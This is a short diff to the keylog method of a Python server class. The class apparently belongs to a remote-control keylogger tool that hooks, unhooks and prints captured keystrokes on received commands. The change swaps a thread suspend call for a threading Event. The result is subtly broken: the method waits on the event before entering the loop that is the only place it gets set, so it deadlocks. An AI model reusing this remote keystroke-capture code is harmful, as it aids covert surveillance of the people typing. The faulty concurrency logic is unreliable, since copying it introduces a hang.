@@ -314,17 +314,20 @@ class Server:
 
     def keylog(self, conn):
         self.tklog = threading.Thread(target=Keylog.startKLog)
+        self.keylog_event = threading.Event()
         s = ""
         self.tklog.start()
-        self.tklog.suspend()
+        self.keylog_event.wait()
         while True:
             s = self.receiveSignal()
             if s == "PRINT":
                 self.printkeys()
             elif s == "HOOK":
                 self.hookKey()
+                self.keylog_event.set()
             elif s == "UNHOOK":
                 self.unhook()
+                self.keylog_event.clear()
             elif s == "QUIT":
                 return
 
